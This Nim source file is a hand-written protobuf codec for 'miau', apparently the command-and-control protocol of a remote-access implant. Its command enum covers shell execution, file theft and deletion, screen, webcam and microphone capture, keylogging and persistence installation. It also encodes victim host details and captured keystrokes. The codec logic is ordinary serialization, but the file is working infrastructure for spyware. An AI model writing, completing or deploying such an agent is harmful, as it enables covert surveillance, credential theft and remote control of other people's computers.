## Miau minimal protobuf wire-format codec (hand-rolled, no macro deps).
##
## Implements the exact subset of messages from miau.proto that the agent
## needs, wire-compatible with Google's protobuf (varint / length-delimited).
##
## Wire format:
##   field = tag(varint) + value
##   tag   = (field_number << 3) | wire_type
##   wire_type: 0=varint, 1=64-bit, 2=length-delimited, 5=32-bit
##   varint: base-128, little-endian groups, MSB = continuation.
import std/strutils

# ---------------------------------------------------------------------------
# enums (values match miau.proto)
# ---------------------------------------------------------------------------
const
  PACKET_UNKNOWN*   = 0
  PACKET_AUTH*      = 1
  PACKET_AUTH_ACK*  = 2
  PACKET_HEARTBEAT* = 3
  PACKET_COMMAND*   = 4
  PACKET_RESPONSE*  = 5
  PACKET_FILE_CHUNK* = 6
  PACKET_SCREEN*    = 7
  PACKET_KEYLOG*    = 8
  PACKET_MODULE*    = 9
  PACKET_EVENT*     = 10

  CMD_NONE*            = 0
  CMD_SHELL_EXEC*      = 1
  CMD_FILE_LIST*       = 2
  CMD_FILE_DOWNLOAD*   = 3
  CMD_FILE_UPLOAD*     = 4
  CMD_FILE_DELETE*     = 5
  CMD_PROCESS_LIST*    = 6
  CMD_PROCESS_KILL*    = 7
  CMD_NET_LIST*        = 8
  CMD_SCREEN_START*    = 9
  CMD_SCREEN_STOP*     = 10
  CMD_WEBCAM_START*    = 11
  CMD_WEBCAM_STOP*     = 12
  CMD_MIC_START*       = 13
  CMD_MIC_STOP*        = 14
  CMD_KEYLOG_START*    = 15
  CMD_KEYLOG_STOP*     = 16
  CMD_PERSIST_INSTALL* = 17
  CMD_PERSIST_REMOVE*  = 18
  CMD_MODULE_LOAD*     = 19
  CMD_MODULE_EXEC*     = 20
  CMD_MODULE_RESTART*  = 21
  CMD_UNINSTALL*       = 22
  CMD_PING*            = 23
  CMD_SYSINFO*         = 24

  RESP_OK*       = 0
  RESP_ERROR*    = 1
  RESP_PENDING*  = 2
  RESP_PARTIAL*  = 3

# ---------------------------------------------------------------------------
# varint primitives
# ---------------------------------------------------------------------------
proc putVarint(buf: var string, v: uint64) =
  var x = v
  while x >= 0x80'u64:
    buf.add(char((x and 0x7f'u64) or 0x80'u64))
    x = x shr 7
  buf.add(char(x))

proc getVarint(s: string, pos: var int): uint64 =
  var shift = 0'u64
  result = 0'u64
  while true:
    if pos >= s.len:
      raise newException(ValueError, "varint truncated")
    let b = uint64(ord(s[pos]))
    pos += 1
    result = result or ((b and 0x7f'u64) shl shift)
    if (b and 0x80'u64) == 0: break
    shift += 7
    if shift > 63:
      raise newException(ValueError, "varint too long")

proc putTag(buf: var string, field: int, wire: int) =
  putVarint(buf, (uint64(field) shl 3) or uint64(wire))

proc putFieldVarint(buf: var string, field: int, v: uint64) =
  putTag(buf, field, 0)
  putVarint(buf, v)

proc putFieldBytes(buf: var string, field: int, data: string) =
  putTag(buf, field, 2)
  putVarint(buf, uint64(data.len))
  buf.add(data)

proc putFieldBool(buf: var string, field: int, v: bool) =
  putFieldVarint(buf, field, if v: 1'u64 else: 0'u64)

# ---------------------------------------------------------------------------
# Envelope: 1=version(uint32) 2=token(string) 3=seq(uint64) 4=timestamp(uint64)
#           5=packet_type(uint32) 6=nonce(bytes) 7=payload(bytes)
# ---------------------------------------------------------------------------
type
  Envelope* = object
    version*: uint32
    token*: string
    seq*: uint64
    timestamp*: uint64
    packetType*: int
    nonce*: string
    payload*: string
    hasVersion*: bool
    hasToken*: bool
    hasSeq*: bool
    hasTimestamp*: bool
    hasPacketType*: bool
    hasNonce*: bool
    hasPayload*: bool

proc encodeEnvelope*(e: Envelope): string =
  if e.hasVersion: putFieldVarint(result, 1, uint64(e.version))
  if e.hasToken and e.token.len > 0: putFieldBytes(result, 2, e.token)
  if e.hasSeq: putFieldVarint(result, 3, e.seq)
  if e.hasTimestamp: putFieldVarint(result, 4, e.timestamp)
  if e.hasPacketType: putFieldVarint(result, 5, uint64(e.packetType))
  if e.hasNonce and e.nonce.len > 0: putFieldBytes(result, 6, e.nonce)
  if e.hasPayload and e.payload.len > 0: putFieldBytes(result, 7, e.payload)

proc decodeEnvelope*(s: string): Envelope =
  var pos = 0
  while pos < s.len:
    let tag = getVarint(s, pos)
    let field = int(tag shr 3)
    let wire = int(tag and 0x7'u64)
    case field
    of 1:
      result.version = uint32(getVarint(s, pos))
      result.hasVersion = true
    of 2:
      let n = int(getVarint(s, pos))
      result.token = s[pos ..< pos + n]
      pos += n
      result.hasToken = true
    of 3:
      result.seq = getVarint(s, pos)
      result.hasSeq = true
    of 4:
      result.timestamp = getVarint(s, pos)
      result.hasTimestamp = true
    of 5:
      result.packetType = int(getVarint(s, pos))
      result.hasPacketType = true
    of 6:
      let n = int(getVarint(s, pos))
      result.nonce = s[pos ..< pos + n]
      pos += n
      result.hasNonce = true
    of 7:
      let n = int(getVarint(s, pos))
      result.payload = s[pos ..< pos + n]
      pos += n
      result.hasPayload = true
    else:
      case wire
      of 0: discard getVarint(s, pos)
      of 1: pos += 8
      of 2:
        let n = int(getVarint(s, pos))
        pos += n
      of 5: pos += 4
      else: raise newException(ValueError, "bad wire type")

# ---------------------------------------------------------------------------
# ClientAuth: 1=token 2=hostname 3=username 4=os 5=arch 6=client_ver 7=install_id
# ---------------------------------------------------------------------------
proc encodeClientAuth*(a: tuple[token, hostname, username, os, arch,
                                 clientVer, installId: string]): string =
  if a.token.len > 0: putFieldBytes(result, 1, a.token)
  if a.hostname.len > 0: putFieldBytes(result, 2, a.hostname)
  if a.username.len > 0: putFieldBytes(result, 3, a.username)
  if a.os.len > 0: putFieldBytes(result, 4, a.os)
  if a.arch.len > 0: putFieldBytes(result, 5, a.arch)
  if a.clientVer.len > 0: putFieldBytes(result, 6, a.clientVer)
  if a.installId.len > 0: putFieldBytes(result, 7, a.installId)

# ---------------------------------------------------------------------------
# AuthAck: 1=accepted(bool) 2=reason(string) 3=hb_interval(uint32)
# ---------------------------------------------------------------------------
type
  AuthAck* = object
    accepted*: bool
    reason*: string
    hbInterval*: uint32
    hasAccepted*: bool
    hasReason*: bool
    hasHbInterval*: bool

proc decodeAuthAck*(s: string): AuthAck =
  var pos = 0
  while pos < s.len:
    let tag = getVarint(s, pos)
    let field = int(tag shr 3)
    let wire = int(tag and 0x7'u64)
    case field
    of 1:
      result.accepted = getVarint(s, pos) != 0'u64
      result.hasAccepted = true
    of 2:
      let n = int(getVarint(s, pos))
      result.reason = s[pos ..< pos + n]
      pos += n
      result.hasReason = true
    of 3:
      result.hbInterval = uint32(getVarint(s, pos))
      result.hasHbInterval = true
    else:
      case wire
      of 0: discard getVarint(s, pos)
      of 1: pos += 8
      of 2:
        let n = int(getVarint(s, pos))
        pos += n
      of 5: pos += 4
      else: raise newException(ValueError, "bad wire type")

# ---------------------------------------------------------------------------
# Heartbeat: 1=cpu(uint32) 2=ram_used(uint32) 3=ram_total(uint32)
#            4=pub_ip 5=priv_ip 6=uptime(uint64)
# ---------------------------------------------------------------------------
proc encodeHeartbeat*(h: tuple[cpu, ramUsed, ramTotal: uint32;
                               pubIp, privIp: string; uptime: uint64]): string =
  if h.cpu > 0: putFieldVarint(result, 1, uint64(h.cpu))
  if h.ramUsed > 0: putFieldVarint(result, 2, uint64(h.ramUsed))
  if h.ramTotal > 0: putFieldVarint(result, 3, uint64(h.ramTotal))
  if h.pubIp.len > 0: putFieldBytes(result, 4, h.pubIp)
  if h.privIp.len > 0: putFieldBytes(result, 5, h.privIp)
  if h.uptime > 0: putFieldVarint(result, 6, h.uptime)

# ---------------------------------------------------------------------------
# Command (decode only): 1=id(uint64) 2=cmd_type(uint32) 3=args 4=blob 5=timeout
# ---------------------------------------------------------------------------
type
  Command* = object
    id*: uint64
    cmdType*: int
    args*: string
    blob*: string
    timeout*: uint32
    hasId*: bool
    hasCmdType*: bool
    hasArgs*: bool
    hasBlob*: bool
    hasTimeout*: bool

proc decodeCommand*(s: string): Command =
  var pos = 0
  while pos < s.len:
    let tag = getVarint(s, pos)
    let field = int(tag shr 3)
    let wire = int(tag and 0x7'u64)
    case field
    of 1:
      result.id = getVarint(s, pos)
      result.hasId = true
    of 2:
      result.cmdType = int(getVarint(s, pos))
      result.hasCmdType = true
    of 3:
      let n = int(getVarint(s, pos))
      result.args = s[pos ..< pos + n]
      pos += n
      result.hasArgs = true
    of 4:
      let n = int(getVarint(s, pos))
      result.blob = s[pos ..< pos + n]
      pos += n
      result.hasBlob = true
    of 5:
      result.timeout = uint32(getVarint(s, pos))
      result.hasTimeout = true
    else:
      case wire
      of 0: discard getVarint(s, pos)
      of 1: pos += 8
      of 2:
        let n = int(getVarint(s, pos))
        pos += n
      of 5: pos += 4
      else: raise newException(ValueError, "bad wire type")

# ---------------------------------------------------------------------------
# Response: 1=id(uint64) 2=status(uint32) 3=message 4=data(bytes) 5=final(bool)
# ---------------------------------------------------------------------------
proc encodeResponse*(r: tuple[id: uint64; status: int; message, data: string;
                              final: bool]): string =
  if r.id > 0: putFieldVarint(result, 1, r.id)
  if r.status > 0: putFieldVarint(result, 2, uint64(r.status))
  if r.message.len > 0: putFieldBytes(result, 3, r.message)
  if r.data.len > 0: putFieldBytes(result, 4, r.data)
  putFieldBool(result, 5, r.final)

# ---------------------------------------------------------------------------
# KeyLog: 1=window 2=text 3=ts(int64)
# ---------------------------------------------------------------------------
proc encodeKeyLog*(k: tuple[window, text: string; ts: int64]): string =
  if k.window.len > 0: putFieldBytes(result, 1, k.window)
  if k.text.len > 0: putFieldBytes(result, 2, k.text)
  if k.ts != 0: putFieldVarint(result, 3, uint64(k.ts))
